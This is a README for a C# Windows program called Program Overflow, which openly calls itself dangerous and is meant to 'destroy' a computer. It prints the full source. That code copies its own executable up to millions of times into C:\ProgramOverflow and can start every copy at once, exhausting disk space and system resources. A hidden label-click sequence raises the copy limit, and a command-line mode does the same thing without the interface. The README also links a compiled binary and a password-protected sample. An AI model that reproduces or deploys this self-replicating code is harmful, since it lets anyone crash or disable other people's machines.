# Lumito's Program Overflow
Program Overflow is an utility that makes lots of copies of it to later run them. It's DANGEROUS!!! Please use it in a VM.
I'm not responsible of any damage this tool can make to your computer. Use it at your own risk.

---
Click [here](https://lumitoluma.github.io/ProgramOverflow#downloading-compiled-source-code) to download Program Overflow or scroll down to the button of this page.

---

![Program overflow image](https://lumitoluma.github.io/images/ProgramOverflow1.2.png)

## Uses of this tool:
1. Test your VM speed and durability.
2. Destroy it!

## Source code analysis:

This is the Form1.cs file, which is the most important one in this project:

```C#
using System;
using System.IO;
using System.Windows.Forms;

namespace ProgramOverflow
{
    public partial class Form1 : Form
    {
        byte counterRipPc;
        byte counterRunPrograms;
        byte RunPrograms;
        short x;
        int i;
        int ProgressBar1Value;

        public Form1()
        {
            InitializeComponent();
            counterRipPc = 0;
            counterRunPrograms = 0;
            RunPrograms = 0;
        }

        private void Button1_Click(object sender, System.EventArgs e)
        {
            button1.Enabled = false;
            progressBar1.Value = 0;
            string domainupdowntext = numericUpDown1.Text;
            int NumberOfCopies = int.Parse(domainupdowntext);
            if (!Directory.Exists("C:\\ProgramOverflow"))
            {
                Directory.CreateDirectory("C:\\ProgramOverflow");
            }
            progressBar1.Maximum = NumberOfCopies * 100;
            ProgressBar1Value = progressBar1.Maximum / NumberOfCopies;
            for (i = 1; i <= NumberOfCopies; i++)
            {
                progressBar1.Value += ProgressBar1Value;
                string destinationFile = "C:\\ProgramOverflow\\Program" + i + ".exe";
                var process = System.Diagnostics.Process.GetCurrentProcess();
                string fullPath = process.MainModule.FileName;
                if (!File.Exists(destinationFile))
                {
                    File.Copy(fullPath, destinationFile, true);
                }
                if (RunPrograms == 1)
                {
                    System.Diagnostics.Process.Start(destinationFile);
                }
            }
            progressBar1.Value = progressBar1.Maximum;
            button1.Enabled = true;
            label1.Text = "Done!!!";
        }

        private void RadioButton1_CheckedChanged(object sender, System.EventArgs e)
        {
                checkBox1.Enabled = true;
                checkBox2.Enabled = true;
        }

        private void CheckBox1_CheckedChanged(object sender, System.EventArgs e)
        {
            if (counterRipPc == 0)
            {
                numericUpDown1.Maximum = 999999;
                label6.Text = "Nº of copies: (Max 999999)";
                counterRipPc = 1;
            }
            else
            {
                numericUpDown1.Maximum = 9999;
                label6.Text = "Nº of copies: (Max 9999)";
                label10.Text = " ";
                counterRipPc = 0;
            }
        }

        private void CheckBox2_CheckedChanged(object sender, System.EventArgs e)
        {
            if (counterRunPrograms == 0)
            {
                RunPrograms = 1;
                counterRunPrograms = 1;
                button1.Text = "Destroy computer";
            }
            else
            {
                RunPrograms = 0;
                counterRunPrograms = 0;
                button1.Text = "Start";
            }
        }

        private void Label7_Click(object sender, System.EventArgs e)
        {
            if(counterRipPc == 1 && x == 0)
            {
                x = 1;
            }
            else
            {
                x = 0;
            }
        }

        private void Label8_Click(object sender, System.EventArgs e)
        {
            if (x == 1)
            {
                x = 2;
            }
            else
            {
                x = 0;
            }
        }

        private void Label9_Click(object sender, System.EventArgs e)
        {
            if (x == 2)
            {
                x = 3;
            }
            else
            {
                x = 0;
            }
        }

        private void Label10_Click(object sender, System.EventArgs e)
        {
            if (x == 3)
            {
                x = 0;
                numericUpDown1.Maximum = 9999999;
                label6.Text = "Nº of copies: (Max 9999999)";
                label10.Text = "Enjoy!";
            }
            else
            {
                x = 0;
            }
        }

        private void Form1_Load(object sender, System.EventArgs e)
        {
            string[] passedInArgs = Environment.GetCommandLineArgs();
            int argnumber;
            try
            {
                argnumber = int.Parse(passedInArgs[1]);
                if(argnumber <= 999999)
                {
                    button1.Enabled = false;
                    progressBar1.Value = 0;
                    if (!Directory.Exists("C:\\ProgramOverflow"))
                    {
                        Directory.CreateDirectory("C:\\ProgramOverflow");
                    }
                    progressBar1.Maximum = argnumber * 100;
                    ProgressBar1Value = progressBar1.Maximum / argnumber;
                    for (i = 1; i <= argnumber; i++)
                    {
                        progressBar1.Value += ProgressBar1Value;
                        string destinationFile = "C:\\ProgramOverflow\\Program" + i + ".exe";
                        var process = System.Diagnostics.Process.GetCurrentProcess();
                        string fullPath = process.MainModule.FileName;
                        if (!File.Exists(destinationFile))
                        {
                            File.Copy(fullPath, destinationFile, true);
                        }
                        if (RunPrograms == 1)
                        {
                            System.Diagnostics.Process.Start(destinationFile);
                        }
                    }
                    progressBar1.Value = progressBar1.Maximum;
                    button1.Enabled = true;
                    label1.Text = "Done!!!";
                    MessageBox.Show("Copied " + argnumber.ToString() + " files correctly!");
                    Environment.Exit(0);
                }
                else
                {
                    MessageBox.Show("Please specify a number between 1 and 999999. 0 yields error");
                    Environment.Exit(0);
                }
            }
            catch
            {
                try
                {
                    string argstring = passedInArgs[1];
                    if (argstring == "Help" || argstring == "help" || argstring == "h" || argstring == "H"
                    || argstring == "/Help" || argstring == "/help" || argstring == "/h" || argstring == "/H"
                    || argstring == "-Help" || argstring == "-help" || argstring == "-h" || argstring == "-H"
                    || argstring == "--Help" || argstring == "--help" || argstring == "--h" || argstring == "--H")
                    {
                        var progname = System.Diagnostics.Process.GetCurrentProcess();
                        string programname = progname.ProcessName;
                        MessageBox.Show("Usage:\n\n" +
                                        "\"" + programname + ".exe [number of copies | /help]\"\n\n" +
                                        "If you don't specify a number of copies, the program will run normally.\n\n" +
                                        "If number of copies isn't a number the program will start normally unless it's /help\n\n" +
                                        "The number of copies must be between 1 and 999999. 0 yields error.\n\n");

                        Environment.Exit(0);
                    }
                }
                catch
                {
                    // Starts the app normally
                }
                
            }
        }
    }
}
```

Also another important one is Program.cs

```C#
using System;
using System.Windows.Forms;

namespace ProgramOverflow
{
    public static class Program
    {
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
```

This one runs the Form1.cs program.

## Building source code:
![.NET Framework](https://github.com/LumitoLuma/ProgramOverflow/workflows/.NET%20Framework/badge.svg)
1. `git clone` the repository or download it using download button.
2. Use `msbuild` to build the repostory. If you use the `msbuild` that is included in .NET framework 4.0 or above, you'll just to run `msbuild` to compile it. If you use Visual Studio's `msbuild` you'll need to run `msbuild /p:Configuration=Release /p:Platform="Any CPU"` to build it.
3. Check the bin\Debug or Release folder and search for Program Overflow executable.
4. Done!!! Enjoy using Lumito's Program Overflow!

## Downloading compiled source code:
You can download compiled source code here:

[![Download Program Overflow](https://a.fsdn.com/con/app/sf-download-button)](https://sourceforge.net/projects/programoverflow/files/Binaries/ProgramOverflow1.2.exe/download)

## Acknowledgements:
Thanks a lot to Endermanch for making those amazing videos that helped me to learn more about computing and for the first version of ProgramOverflow. You can visit his github in the next link [github.com/endermanch](https://github.com/endermanch), his youtube in this link [youtube.com/endermanch](https://www.youtube.com/endermanch) and the download his ProgramOverflow [here](https://dl.malwat.ch/software/ProgramOverflow.zip) (Password: mysubsarethebest).

And for you for using my software!

Hope you enjoy using it.

#### © 2020, [Lumito](https://lumitoluma.github.io)
